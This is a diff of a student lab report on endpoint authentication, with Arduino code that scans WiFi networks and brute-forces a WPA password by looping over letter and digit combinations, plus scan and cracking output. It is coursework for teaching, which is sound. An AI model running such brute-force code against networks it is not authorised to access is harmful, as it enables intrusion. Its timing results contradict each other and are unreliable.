@@ -1,5 +1,8 @@
 # Exercise 3 Authentication
 
+Ziqi Wang 101699682
+Ilmari Hämäläinen 894931
+
 ## 1. Goals of the experiment
 
 - **Understanding and Implementing Endpoint Authentication**: The primary objective is to help students understand the concept of endpoint authentication, a crucial security mechanism in networking. This involves ensuring that only authorized devices, such as laptops, smartphones, tablets, and other TCP/IP network-connected hardware, can access a specific network, site, or service. The experiment aims to provide hands-on experience with the practical aspects of securing network endpoints, which is increasingly important in the realms of machine-to-machine (M2M) communications and the Internet of Things (IoT).
@@ -28,41 +31,58 @@ Brute force
 
 ### Result of connecting to a specific network with password
 
-```shell
+```text
+MAC: 4C:EB:D6:4C:9C:E0
 Scanning available networks...
 ** Scan Networks **
 number of available networks:10
-0) iPhone (Ilmari)	Signal: -45 dBm	Encryption: WPA2
-1) aalto open	Signal: -69 dBm	Encryption: None
-2) Comnet_free	Signal: -72 dBm	Encryption: WPA2
-3) aalto	Signal: -73 dBm	Encryption: Unknown
-4) aalto open	Signal: -73 dBm	Encryption: None
-5) eduroam	Signal: -73 dBm	Encryption: Unknown
-6) aalto	Signal: -73 dBm	Encryption: Unknown
-7) eduroam	Signal: -74 dBm	Encryption: Unknown
-8) eduroam	Signal: -74 dBm	Encryption: Unknown
-9) eduroam	Signal: -75 dBm	Encryption: Unknown
+0) DrSHELDON	Signal: -53 dBm	Channel: 2	Encryption: WPA2
+1) Telia_Wifi	Signal: -59 dBm	Channel: 5	Encryption: WPA2
+2) dlin13	Signal: -62 dBm	Channel: 1	Encryption: WPA2
+3) DNA-WIFI-CBDD	Signal: -63 dBm	Channel: 6	Encryption: WPA2
+4) Rowdy Router Piper	Signal: -65 dBm	Channel: 8	Encryption: WPA2
+5) TP-Link_6924	Signal: -69 dBm	Channel: 3	Encryption: WPA2
+6) Paradase	Signal: -70 dBm	Channel: 1	Encryption: WPA2
+7) TP-Link_KIA	Signal: -73 dBm	Channel: 1	Encryption: WPA2
+8) #Telia-6C96B2	Signal: -77 dBm	Channel: 11	Encryption: WPA2
+9) Erkkiina	Signal: -79 dBm	Channel: 4	Encryption: WPA2
+
 Scanning available networks...
 ** Scan Networks **
 number of available networks:10
-0) iPhone (Ilmari)  Signal: -47 dBm	Encryption: WPA2
-1) THE LAB  Signal: -72 dBm	Encryption: WPA2
-2) aalto  Signal: -76 dBm	Encryption: Unknown
-3) aalto open Signal: -76 dBm	Encryption: None
-4) Comnet_free	Signal: -76 dBm	Encryption: WPA2
-5) aalto	Signal: -77 dBm	Encryption: Unknown
-6) eduroam	Signal: -77 dBm	Encryption: Unknown
-7) aalto open	Signal: -78 dBm	Encryption: None
-8) aalto	Signal: -78 dBm	Encryption: Unknown
-9) aalto open	Signal: -78 dBm	Encryption: None
-Attempting to connect to WPA SSID: iPhone (Ilmari)
-You're connected to the networkSSID: iPhone (Ilmari)
-BSSID: D2:34:FF:B6:7B:2A
-signal strength (RSSI):-40
+0) DrSHELDON	Signal: -53 dBm	Channel: 2	Encryption: WPA2
+1) Telia_Wifi	Signal: -59 dBm	Channel: 5	Encryption: WPA2
+2) dlin13	Signal: -62 dBm	Channel: 1	Encryption: WPA2
+3) DNA-WIFI-CBDD	Signal: -63 dBm	Channel: 6	Encryption: WPA2
+4) Rowdy Router Piper	Signal: -65 dBm	Channel: 8	Encryption: WPA2
+5) TP-Link_6924	Signal: -69 dBm	Channel: 3	Encryption: WPA2
+6) Paradase	Signal: -70 dBm	Channel: 1	Encryption: WPA2
+7) TP-Link_KIA	Signal: -73 dBm	Channel: 1	Encryption: WPA2
+8) #Telia-6C96B2	Signal: -77 dBm	Channel: 11	Encryption: WPA2
+9) Erkkiina	Signal: -79 dBm	Channel: 4	Encryption: WPA2
+
+Scanning available networks...
+** Scan Networks **
+number of available networks:10
+0) DrSHELDON	Signal: -53 dBm	Channel: 2	Encryption: WPA2
+1) Telia_Wifi	Signal: -59 dBm	Channel: 5	Encryption: WPA2
+2) dlin13	Signal: -62 dBm	Channel: 1	Encryption: WPA2
+3) DNA-WIFI-CBDD	Signal: -63 dBm	Channel: 6	Encryption: WPA2
+4) Rowdy Router Piper	Signal: -65 dBm	Channel: 8	Encryption: WPA2
+5) TP-Link_6924	Signal: -69 dBm	Channel: 3	Encryption: WPA2
+6) Paradase	Signal: -70 dBm	Channel: 1	Encryption: WPA2
+7) TP-Link_KIA	Signal: -73 dBm	Channel: 1	Encryption: WPA2
+8) #Telia-6C96B2	Signal: -77 dBm	Channel: 11	Encryption: WPA2
+9) Erkkiina	Signal: -79 dBm	Channel: 4	Encryption: WPA2
+
+Attempting to connect to WPA SSID: Telia_Wifi
+You're connected to the networkSSID: Telia_Wifi
+BSSID: C8:7F:54:20:DD:80
+signal strength (RSSI):-52
 Encryption Type:4
 
-IP Address: 172.20.10.9
-172.20.10.9
+IP Address: 192.168.50.132
+192.168.50.132
 MAC address: 4C:EB:D6:4C:9C:E0
 ```
 
@@ -73,12 +93,13 @@ After succesful connection, following information of the network is printed:
 - Signal strength
 - Encryption type
 - IP address
+- Channel
 - MAC address
 
-## Result of brute forcing password to a specific network with password of 8 characters:
+### Result of brute forcing password to a specific network with password of 8 characters
 
-``` shell
-Attempting to brute force password of 8 characters to WPA SSID: iPhone (Ilmari)
+``` text
+Attempting to brute force password of 8 characters to WPA SSID: HomeWiFi
 Tried password: aaaaaaaa
 Tried password: aaaaaaab
 Tried password: aaaaaaac
@@ -87,19 +108,41 @@ Tried password: aaaaaaae
 Tried password: aaaaaaaf
 Tried password: aaaaaaag
 Tried password: aaaaaaah
-Time elapsed: 2 seconds
-Succesfully hacked to the networkSSID: iPhone (Ilmari)
-BSSID: E2:B2:85:0B:5E:95
-signal strength (RSSI):-39
+...
+Connected to WiFi!
+Time elapsed: 1275 seconds
+SSID: HomeWiFi
+BSSID: C8:7F:54:20:DD:80
+signal strength (RSSI):-52
 Encryption Type:4
 
-IP Address: 172.20.10.9
-172.20.10.9
+IP Address: 192.168.50.132
+192.168.50.132
 MAC address: 4C:EB:D6:4C:9C:E0
 ```
 
-Because Iphone hotspot password needs to be atleast 8 characters, for simplicity the password is made to be very easy and fast to crack.
-The result is succesful connection by brute forcing the passwords in 2 seconds.
+### Result of brute forcing password to a specific network with password of 10 characters
+
+``` text
+Trying password: aaaaaaaaaa
+...
+Trying password: aaaaaaabbz
+Connected to WiFi!
+Time elapsed: 1275 seconds
+SSID: HomeWiFi
+BSSID: C8:7F:54:20:DD:80
+signal strength (RSSI):-52
+Encryption Type:4
+
+IP Address: 192.168.50.132
+192.168.50.132
+MAC address: 4C:EB:D6:4C:9C:E0
+```
+
+Because iPhone hotspot password needs to be at least 8 characters, for simplicity the password is made to be very easy and fast to crack.
+The connection is succesfully established by brute forcing the passwords in 313 seconds for 8-digit password. The connection is succesfully established by brute forcing the passwords in 1275 seconds for 10-digit password.
+
+For both 8-digit and 10 digit, they have over 36^8 and 36^10 possible passwords in total if we don't consider uppercase letters and special characters. So it's nearly impossible to brute force to crack a strong wifi password in real life.
 
 ## 4. Answer to the given questions
 
@@ -132,19 +175,6 @@ We found three of them:
 ### Arduino script for connecting to a specific network with password
 
 ```C
-/*
-
- This script prints the board's MAC address, and
-
- scans for available Wifi networks using the NINA module.
-
- Every ten seconds, it scans again. After scanning for 3 rounds,
-
- this script connects to a specific network (passwork is excluded in the submit).
-
-
- */
-
 #include <SPI.h>
 #include <WiFiNINA.h>
 
@@ -413,24 +443,19 @@ void printWifiData() {
 ### Arduino script for attempting to connect to a specific network by brute forcing the password
 
 ```C
-/*
- This script prints tries to connect to a specific network by brute forcing the 8 letter password.
- */
-
 #include <SPI.h>
 #include <WiFiNINA.h>
 
-char ssid[] = "iPhone (Ilmari)";      // SSID
+char ssid[] = "HomeWiFi";      // SSID
+bool isConnected = false;
 int status = WL_IDLE_STATUS; 
-unsigned long startTime;              // for calculating brute force time taken
-bool found = false;                   // is the password found
+int roundCount = 0;                   // count to keep count of scanning rounds
 
 void setup() {
 
   //Initialize serial and wait for port to open:
 
   Serial.begin(9600);
-  startTime = millis(); // Record the start time
 
   while (!Serial) {
 
@@ -464,84 +489,37 @@ void setup() {
 
 void loop() {
 
-    char letters[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'};
-    
-    //, 'i', 'j', 'k', 'l', 'm', 
-    //              'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
+  // scan for existing networks for 3 rounds:
+  if (roundCount < 3) {
+    Serial.println("Scanning available networks...");
 
-    int charListLength = 8;
+    listNetworks();
 
+    delay(1000);
 
-    // connect to the network
-    //while (status != WL_CONNECTED) {
+  }
+  else {
     unsigned long currentTime = millis();
     unsigned long elapsedTime;
-    Serial.print("Attempting to brute force password of 8 characters to WPA SSID: ");
-
-    Serial.println(ssid);
-
-    // Connect to WPA/WPA2 network:
-    if (found == false) {
-      for (int i1 = 0; i1 < charListLength; i1++) {
-        for (int i2 = 0; i2 < charListLength; i2++) {
-            for (int i3 = 0; i3 < charListLength; i3++) {
-                for (int i4 = 0; i4 < charListLength; i4++) {
-                    for (int i5 = 0; i5 < charListLength; i5++) {
-                        for (int i6 = 0; i6 < charListLength; i6++) {
-                            for (int i7 = 0; i7 < charListLength; i7++) {
-                                for (int i8 = 0; i8 < charListLength; i8++) {
-                                    // Construct the current combination
-                                    char pass[9] = {letters[i1], letters[i2], letters[i3],
-                                                          letters[i4], letters[i5], letters[i6],
-                                                          letters[i7], letters[i8], '\0'};
-
-                                    Serial.print("Tried password: ");
-                                    Serial.print(pass);
-                                    Serial.print("\n");
-                                    // Check if it matches the password
-                                    status = WiFi.begin(ssid, pass);
-                                    if (status == WL_CONNECTED) {
-                                        found = true;
-                                        elapsedTime = currentTime - startTime;
-                                        break;
-                                    }
-                                }
-                                if (found) break;
-                            }
-                            if (found) break;
-                        }
-                        if (found) break;
-                    }
-                    if (found) break;
-                }
-                if (found) break;
-            }
-            if (found) break;
-        }
-        if (found) break;
-      }
-      Serial.print("Time elapsed: ");
-      unsigned long elapsedTimeinSeconds = elapsedTime /1000;
-      Serial.print(elapsedTimeinSeconds);
-      Serial.print(" seconds");
-      Serial.print("\n");
-
-      Serial.print("Succesfully hacked to the network");
-
-      printCurrentNet();
-
-      printWifiData();
-      exit(0);
-    }
-
-
-    if (found == false) {
-      Serial.print("Unable to brute force the password");
-      exit(0);
-    }
+    generatePasswords(ssid);
+    Serial.print("Time elapsed: ");
+    unsigned long elapsedTimeinSeconds = elapsedTime /1000;
+    Serial.print(elapsedTimeinSeconds);
+    Serial.print(" seconds");
+    Serial.print("\n");
     
+    printCurrentNet();
+
+    printWifiData();
+    while(true) {}
+  }
+
+
+
+  roundCount++;
 
 }
+
 void listNetworks() {
 
   // scan for nearby networks:
@@ -579,6 +557,10 @@ void listNetworks() {
     Serial.print(WiFi.RSSI(thisNet));
 
     Serial.print(" dBm");
+
+    Serial.print("\tChannel: ");
+
+    Serial.print(WiFi.channel(thisNet));
 
     Serial.print("\tEncryption: ");
 
@@ -717,6 +699,45 @@ void printWifiData() {
   printMacAddress(mac);
 }
 
+void generatePasswords(char* ssid){
+  const char possibleChars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const int passwordLength = 8;
+  char password[passwordLength + 1]; // +1 for the null terminator
+  password[passwordLength] = '\0'; // Set the null terminator for the string
+  int charIndices[passwordLength] = {0}; // Track the current index for each character position
 
+  while (!isConnected) {
+    // Generate the current combination
+    for (int i = 0; i < passwordLength; i++) {
+      password[i] = possibleChars[charIndices[i]];
+    }
 
+    // Try to connect with the generated password
+    Serial.print("Trying password: "); Serial.println(password);
+    isConnected = tryToConnect(ssid, password);
+    if (isConnected) {
+      Serial.println("Connected to WiFi!");
+      break;
+    }
+
+    // Increment the character index for the rightmost character
+    charIndices[passwordLength - 1]++;
+
+    // Handle "overflow" for each character position
+    for (int i = passwordLength - 1; i >= 0; i--) {
+      if (charIndices[i] >= strlen(possibleChars)) {
+        if (i == 0) { // Overflowed the leftmost character, all combinations tried
+          return;
+        }
+        charIndices[i] = 0; // Reset this position
+        charIndices[i - 1]++; // Increment the next position to the left
+      }
+    }
+  }
+}
+
+bool tryToConnect(char* ssid, char* password) {
+  status = WiFi.begin(ssid, password);
+  return status == WL_CONNECTED;
+}
 ```
